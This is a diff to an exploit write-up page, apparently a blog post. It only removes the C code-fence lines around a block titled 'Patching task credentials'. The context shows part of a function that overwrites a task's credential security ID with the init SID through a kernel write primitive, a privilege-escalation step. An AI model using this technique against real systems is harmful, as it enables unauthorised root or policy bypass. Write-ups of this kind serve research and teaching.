@@ -150,7 +150,6 @@ During the exploit execution the process executed need to be patched with the co
 
 
 {{< code language="bash" title="Patching task credentials" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
-```c
 void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
 {
     uint64_t val;
@@ -185,5 +184,4 @@ void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
         write32((uint64_t)&sec->sid, init_sid);
     }
 }
-```
 {{< /code >}}
